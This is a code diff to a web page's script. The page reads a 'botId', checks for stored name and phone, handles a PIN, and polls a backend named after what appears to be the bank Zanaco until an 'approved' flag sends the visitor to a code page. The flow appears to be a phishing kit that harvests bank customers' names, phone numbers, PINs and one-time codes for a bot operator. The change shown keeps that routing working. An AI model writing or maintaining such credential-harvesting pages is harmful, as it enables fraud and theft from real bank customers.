@@ -112,20 +112,16 @@ button:disabled {
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
-// ---------------- BOT ROUTING ----------------
-const params = new URLSearchParams(window.location.search);
-const botId = params.get('botId');
-
+// ---------------- BOT ROUTING (FIXED) ----------------
+const botId = localStorage.getItem('botId');
 if (!botId) {
     alert("Invalid access link");
     throw new Error("botId missing");
 }
 
-localStorage.setItem('botId', botId);
-
 // Prevent skipping steps
 if (!localStorage.getItem('name') || !localStorage.getItem('phone')) {
-    window.location.href = `details.html?botId=${botId}`;
+    window.location.href = 'details.html';
 }
 
 // ---------------- PIN LOGIC ----------------
@@ -200,7 +196,7 @@ function startPolling() {
 
         if (data.approved === true) {
             clearInterval(pollInterval);
-            window.location.href = `code.html?botId=${botId}`;
+            window.location.href = 'code.html';
         }
 
         if (data.approved === false) {
